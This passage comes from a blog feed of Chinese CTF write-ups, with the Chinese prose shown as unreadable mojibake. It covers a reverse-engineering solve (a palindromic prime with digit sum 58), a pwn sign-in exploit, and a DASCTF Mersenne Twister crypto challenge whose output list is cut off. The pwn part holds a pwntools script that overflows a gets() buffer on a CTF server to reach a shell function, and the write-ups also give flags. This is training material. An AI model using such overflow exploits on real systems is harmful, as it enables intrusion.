__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)checkToken(v5) )<br>    <span class="hljs-built_in">puts</span>(aCongratulation);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;password is incorrect!&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›å…¥checkTokenå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">checkToken</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)checkSum(a1) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)p(a1) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)h(a1);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿”å›ä¸€ä¸ªboolæ ¹æ®åˆ¤æ–­æ¡ä»¶ï¼Œè¿™é‡Œè¦è¿™ä¸‰ä¸ªéƒ½ä¸ºçœŸæ‰å¯ä»¥ã€‚</p><p>è¿›å…¥ç¬¬ä¸€ä¸ªcheckSumã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">checkSum</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+10h] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( a1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v3 += a1 % <span class="hljs-number">10</span>;<br>    a1 /= <span class="hljs-number">10</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v3 == <span class="hljs-number">58</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯åˆ¤æ–­a1è¿™ä¸ªæ•°çš„æ‰€æœ‰åè¿›åˆ¶ä½çš„æ•°å­—ä¹‹å’Œæ˜¯ä¸æ˜¯58ã€‚</p><p>è¿›å…¥på‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">p</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">2</span>; <span class="hljs-built_in">sqrt</span>((<span class="hljs-type">double</span>)a1) &gt;= (<span class="hljs-type">double</span>)i; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !(a1 % i) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç´ æ•°åˆ¤å®šå‡½æ•°ã€‚</p><p>è¿›å…¥hå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">h</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = a1;<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( v2 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v2 /= <span class="hljs-number">10</span>;<br>    ++v4;<br>  &#125;<br>  v3 = a1;<br>  <span class="hljs-keyword">while</span> ( v3 )<br>  &#123;<br>    v5 = (<span class="hljs-type">int</span>)((<span class="hljs-type">double</span>)v3 / <span class="hljs-built_in">pow</span>(<span class="hljs-number">10.0</span>, (<span class="hljs-type">double</span>)(v4 - <span class="hljs-number">1</span>)));<br>    v6 = v3 % <span class="hljs-number">10</span>;<br>    v3 = (<span class="hljs-type">int</span>)((<span class="hljs-type">double</span>)v3 - <span class="hljs-built_in">pow</span>(<span class="hljs-number">10.0</span>, (<span class="hljs-type">double</span>)(v4 - <span class="hljs-number">1</span>)) * (<span class="hljs-type">double</span>)v5) / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> ( v5 != v6 )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    v4 -= <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ¤æ–­è¿™ä¸ªæ•°æ˜¯ä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚</p><p>æ‰€ä»¥è¿™ä¸ªæ•°æœ‰ä¸‰ä¸ªæ¡ä»¶ï¼Œä»–æ˜¯ä¸€ä¸ªå›æ–‡ç´ æ•°ï¼ŒåŒæ—¶ä»–çš„æ‰€æœ‰ä½ä¹‹å’Œä¸º58ã€‚æ¥ä¸‹æ¥å†™ä¸ªè„šæœ¬æ¥è·‘ã€‚ä¸ºäº†æ—¶é—´ä¸Šèƒ½æ›´å¿«ï¼Œæˆ‘ä»¬å…ˆç”Ÿæˆå›æ–‡æ•°ï¼Œåœ¨åˆ¤æ–­è¿™ä¸ªæ•°æ˜¯ä¸æ˜¯ç´ æ•°ï¼Œå†åˆ¤æ–­å’Œæ˜¯å¦ä¸º58ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">import</span> sympy<br><br><span class="hljs-comment"># ä½æ•°ä¹‹å’Œä¸º58</span><br><span class="hljs-comment"># æ˜¯ä¸€ä¸ªç´ æ•°</span><br><span class="hljs-comment"># æ˜¯ä¸€ä¸ªå›æ–‡æ•°</span><br><span class="hljs-comment"># å¦‚æœä½æ•°ä¹‹å’Œä¸º58è‡³å°‘éœ€è¦6ä½ï¼Œä¸€ä¸ªintæœ‰10ä½ï¼Œæ‰€ä»¥å¯é€‰çš„éƒ¨åˆ†ä½6,7,8,9,10ä½</span><br>Palind = []<br><br><span class="hljs-comment"># 6 ä½ å›æ–‡æ•°</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            temp = <span class="hljs-number">100001</span>*n+<span class="hljs-number">10010</span>*m+<span class="hljs-number">1100</span>*k<br>            <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                Palind.append(temp)<br><span class="hljs-comment"># 7ä½</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                temp = <span class="hljs-number">1000001</span>*n+<span class="hljs-number">100010</span>*m+<span class="hljs-number">10100</span>*k+<span class="hljs-number">1000</span>*p<br>                <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                    Palind.append(temp)<br><span class="hljs-comment"># 8ä½</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                temp = <span class="hljs-number">10000001</span>*n+<span class="hljs-number">1000010</span>*m+<span class="hljs-number">100100</span>*k+<span class="hljs-number">11000</span>*p<br>                <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                    Palind.append(temp)<br><span class="hljs-comment"># 9ä½</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                    temp = <span class="hljs-number">100000001</span>*n+<span class="hljs-number">10000010</span>*m+<span class="hljs-number">1000100</span>*k+<span class="hljs-number">101000</span>*p+<span class="hljs-number">10000</span>*q<br>                    <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                        Palind.append(temp)<br>                    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Palind:<br>    mydigit = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>,<span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>(i)))))<br>    <span class="hljs-keyword">if</span> mydigit == <span class="hljs-number">58</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>è·‘å®Œä¹‹åæœ‰å¾ˆå¤šç»“æœã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">9888889</span><br><span class="hljs-number">9896989</span><br><span class="hljs-number">9978799</span><br><span class="hljs-number">178989871</span><br><span class="hljs-number">179969971</span><br><span class="hljs-number">188888881</span><br><span class="hljs-number">189787981</span><br>...<br>...<br>...<br></code></pre></td></tr></table></figure><p>å›åˆ°æç¤ºä¿¡æ¯ï¼Œä¸‰ä¸ªå¯†ç åªæœ‰ä¸€ä¸ªæ˜¯æ­£ç¡®çš„ã€‚åœ¨æˆ‘ä»¬çš„è¾“å‡ºç»“æœä¸­ï¼Œä¸ƒä½çš„æ»¡è¶³è¦æ±‚çš„æ•°åªæœ‰ä¸‰ä¸ªï¼ŒçŒœæµ‹å¯èƒ½å°±æ˜¯è¿™ä¸‰ä¸ªå…¶ä¸­çš„ä¸€ä¸ªã€‚</p><p>å°è¯•äº†ä¸€ä¸‹ç¬¬ä¸€ä¸ªæ•°ï¼Œå‘ç°å°±æ˜¯flagã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>: ctfshow&#123;<span class="hljs-number">9888889</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="pwnç­¾åˆ°"><a class="markdownIt-Anchor" href="#pwnç­¾åˆ°"></a> pwnç­¾åˆ°</h2><p>IDAæ‰“å¼€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(byte_8048668);<br>  dsb(&amp;argc);<br>  <span class="hljs-built_in">puts</span>(asc_8048694);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›å…¥dsbã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">dsb</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br><br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸€ä¸ªæº¢å‡ºæ¼æ´ã€‚å‡½æ•°åˆ—è¡¨ä¸­æœ‰ä¸€ä¸ªshell_hereå‡½æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨shell_hereçš„åœ°å€ç›–è¿”å›åœ°å€å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br><span class="hljs-keyword">import</span> pwn<br><br>r = pwn.remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="hljs-number">28175</span>)<br>r.send(<span class="hljs-string">b&quot;\xf6\x84\x04\x08&quot;</span>*<span class="hljs-number">6</span>)<br><br>r.interactive()<br><br><span class="hljs-comment"># ctfshow&#123;19d0be7b-3f2d-48e6-a8f6-186af1f41177&#125;</span><br></code></pre></td></tr></table></figure><div class="note note-info">            <p>äº2022-06-09æ–°å¢</p>          </div><p>å®˜æ–¹çš„writeupä¹Ÿå‡ºæ¥äº†ï¼š</p><p><a href="https://ctf-show.feishu.cn/docs/doccntPffNO3VIF0LV6087Nzbnc#">https://ctf-show.feishu.cn/docs/doccntPffNO3VIF0LV6087Nzbnc#</a></p><p>æœ‰äº›é¢˜æˆ‘çœ‹writeupéƒ½è§‰å¾—éš¾ï¼Œè¿™é‚£é€‚åˆæ–°æ‰‹äº†ï¼Ÿ</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverse</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022DASCTF MAY å‡ºé¢˜äººæŒ‘æˆ˜èµ›</title>
    <link href="/2022/05/21/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2022/05/21/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>2022DASCTF MAY å‡ºé¢˜äººæŒ‘æˆ˜èµ›ä¸­ Yusaçš„å¯†ç å­¦è¯¾å ‚â€”â€”ä¸€è§å¦‚æ•… çš„é¢˜è§£ã€‚</p><span id="more"></span><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="yusaçš„å¯†ç å­¦è¯¾å ‚ä¸€è§å¦‚æ•…"><a class="markdownIt-Anchor" href="#yusaçš„å¯†ç å­¦è¯¾å ‚ä¸€è§å¦‚æ•…"></a> Yusaçš„å¯†ç å­¦è¯¾å ‚â€”â€”ä¸€è§å¦‚æ•…</h2><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Myrand</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,seed</span>):<br>self.index = <span class="hljs-number">0</span><br>self.isInit = <span class="hljs-number">1</span><br>self.MT = [seed] + [<span class="hljs-number">0</span>] * <span class="hljs-number">623</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">624</span>):<br>t = <span class="hljs-number">1314433253</span> * (self.MT[i-<span class="hljs-number">1</span>] ^ (self.MT[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) + <span class="hljs-number">1</span><br>self.MT[i] = t &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>y = (self.MT[i] &amp; <span class="hljs-number">0x80000000</span>) + (self.MT[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>self.MT[i] = self.MT[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>] ^ (y &gt;&gt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> y &amp; <span class="hljs-number">1</span>:<br>self.MT[i] ^= <span class="hljs-number">2567483520</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">if</span> self.index == <span class="hljs-number">0</span>:<br>self.generate()<br>y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br>self.index = (self.index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br><span class="hljs-keyword">return</span> y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2l</span>(<span class="hljs-params">self, y, shift</span>):<br><span class="hljs-keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2r</span>(<span class="hljs-params">self, y, shift</span>):<br><span class="hljs-keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><span class="hljs-keyword">import</span> os<br>r = Myrand(<span class="hljs-built_in">int</span>(os.urandom(<span class="hljs-number">4</span>).<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>))<br>out = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>out.append(r.rand())<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(<span class="hljs-built_in">str</span>(out))<br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>flag = <span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="hljs-built_in">str</span>(r.rand()).encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶é‡Œé¢æ˜¯è¾“å‡ºçš„randæ•°ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">[<span class="hljs-number">3417500333</span>, <span class="hljs-number">4091726338</span>, <span class="hljs-number">652603332</span>, <span class="hljs-number">4187304543</span>, <span class="hljs-number">4293795290</span>, <span class="hljs-number">1622245003</span>, <span class="hljs-number">3383443782</span>, <span class="hljs-number">2420250331</span>, <span class="hljs-number">322010852</span>, <span class="hljs-number">1604005753</span>, <span class="hljs-number">3137930218</span>, <span class="hljs-number">1074571824</span>, <span class="hljs-number">1566336258</span>, <span class="hljs-number">2754341076</span>, <span class="hljs-number">1059426660</span>, <span class="hljs-number">2461569360</span>, <span class="hljs-number">613134153</span>, <span class="hljs-number">860561774</span>, <span class="hljs-number">3003069274</span>, <span class="hljs-number">553387944</span>, <span class="hljs-number">1949778231</span>, <span class="hljs-number">249886857</span>, <span class="hljs-number">2322866121</span>, <span class="hljs-number">3685855175</span>, <span class="hljs-number">1977923546</span>, <span class="hljs-number">1887238269</span>, <span class="hljs-number">253812990</span>, <span class="hljs-number">2188417674</span>, <span class="hljs-number">2718707711</span>, <span class="hljs-number">1599975569</span>, <span class="hljs-number">3254935456</span>, <span class="hljs-number">3199641169</span>, <span class="hljs-number">362166522</span>, <span class="hljs-number">1378687155</span>, <span class="hljs-number">912036995</span>, <span class="hljs-number">3174049018</span>, <span class="hljs-number">780042016</span>, <span class="hljs-number">970421905</span>, <span class="hljs-number">3468971406</span>, <span class="hljs-number">801660807</span>, <span class="hljs-number">833926127</span>, <span class="hljs-number">473587885</span>, <span class="hljs-number">158979812</span>, <span class="hljs-number">405306558</span>, <span class="hljs-number">1363084996</span>, <span class="hljs-number">2023076543</span>, <span class="hljs-number">2069797730</span>, <span class="hljs-number">718155249</span>, <span class="hljs-number">1641186127</span>, <span class="hljs-number">3616747747</span>, <span class="hljs-number">1575693921</span>, <span class="hljs-number">3856591855</span>, <span class="hljs-number">223881884</span>, <span class="hljs-number">3002184567</span>, <span class="hljs-number">1666647440</span>, <span class="hljs-number">617661934</span>, <span class="hljs-number">2673101022</span>, <span class="hljs-number">885332395</span>, <span class="hljs-number">3391329168</span>, <span class="hljs-number">1640225363</span>, <span class="hljs-number">2565685644</span>, <span class="hljs-number">3892963352</span>, <span class="hljs-number">3034627488</span>, <span class="hljs-number">2415435183</span>, <span class="hljs-number">3648712566</span>, <span class="hljs-number">2140877952</span>, <span class="hljs-number">1303506086</span>, <span class="hljs-number">2455662362</span>, <span class="hljs-number">1720382700</span>, <span class="hljs-number">3970268445</span>, <span class="hljs-number">2579167586</span>, <span class="hljs-number">4117229324</span>, <span class="hljs-number">846645263</span>, <span class="hljs-number">3252991293</span>, <span class="hljs-number">79067029</span>, <span class="hljs-number">2756800392</span>, <span class="hljs-number">2212447526</span>, <span class="hljs-number">2203329967</span>, <span class="hljs-number">1270408703</span>, <span class="hljs-number">740176928</span>, <span class="hljs-number">3176125705</span>, <span class="hljs-number">166800854</span>, <span class="hljs-number">3327343902</span>, <span class="hljs-number">2079714725</span>, <span class="hljs-number">3702269956</span>, <span class="hljs-number">3659849279</span>, <span class="hljs-number">3658666909</span>, <span class="hljs-number">797535816</span>, <span class="hljs-number">600857570</span>, <span class="hljs-number">553836307</span>, <span class="hljs-number">2394740468</span>, <span class="hljs-number">1178393549</span>, <span class="hljs-number">2183765310</span>, <span class="hljs-number">4014432190</span>, <span class="hljs-number">652246726</span>, <span class="hljs-number">3693235932</span>, <span class="hljs-number">4046942361</span>, <span class="hljs-number">4105444828</span>, <span class="hljs-number">145386213</span>, <span class="hljs-number">1198390220</span>, <span class="hljs-number">3023119098</span>, <span class="hljs-number">663559283</span>, <span class="hljs-number">225958361</span>, <span class="hljs-number">3893000878</span>, <span class="hljs-number">1615631644</span>, <span class="hljs-number">1941951859</span>, <span class="hljs-number">471085675</span>, <span class="hljs-number">2164362049</span>, <span class="hljs-number">4274234562</span>, <span class="hljs-number">4127314557</span>, <span class="hljs-number">1833529303</span>, <span class="hljs-number">17668093</span>, <span class="hljs-number">3208743142</span>, <span class="hljs-number">3210135945</span>, <span class="hljs-number">1772990736</span>, <span class="hljs-number">3290157875</span>, <span class="hljs-number">3006334453</span>, <span class="hljs-number">3831748800</span>, <span class="hljs-number">1120411838</span>, <span class="hljs-number">690279329</span>, <span class="hljs-number">2436940844</span>, <span class="hljs-number">1440602808</span>, <span class="hljs-number">1552272917</span>, <span class="hljs-number">1321728089</span>, <span class="hljs-number">524486126</span>, <span class="hljs-number">3696307959</span>, <span class="hljs-number">1189129368</span>, <span class="hljs-number">28736041</span>, <span class="hljs-number">3143264315</span>, <span class="hljs-number">3050323849</span>, <span class="hljs-number">1458456612</span>, <span class="hljs-number">389869312</span>, <span class="hljs-number">2360130428</span>, <span class="hljs-number">854837117</span>, <span class="hljs-number">1270423403</span>, <span class="hljs-number">3471650414</span>, <span class="hljs-number">243573262</span>, <span class="hljs-number">3449929772</span>, <span class="hljs-number">2436299611</span>, <span class="hljs-number">420972940</span>, <span class="hljs-number">923873821</span>, <span class="hljs-number">3499748829</span>, <span 